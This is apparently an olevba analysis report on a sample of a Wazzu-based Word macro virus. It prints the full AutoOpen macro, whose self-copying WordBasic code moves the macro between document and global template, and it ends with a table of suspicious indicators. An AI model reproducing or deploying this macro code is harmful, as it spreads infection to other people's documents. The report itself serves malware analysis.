olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-55359a7c0f9e05a9533f314d978686c271e75145
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-55359a7c0f9e05a9533f314d978686c271e75145 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUTOOpen.bas 
in file: Virus.MSWord.Wazzu-based-55359a7c0f9e05a9533f314d978686c271e75145 - OLE stream: 'Macros/VBA/aUTOOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim A$
Dim F$
Dim G$
On Error Resume Next
A$ = ":aUTOOpen"
F$ = WordBasic.[FileName$]() + A$
G$ = "Global" + A$
If UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4)) = ".DOT" Then
WordBasic.MacroCopy G$, F$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy F$, G$
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Wazzu-based-55359a7c0f9e05a9533f314d978686c271e75145 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUTOOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

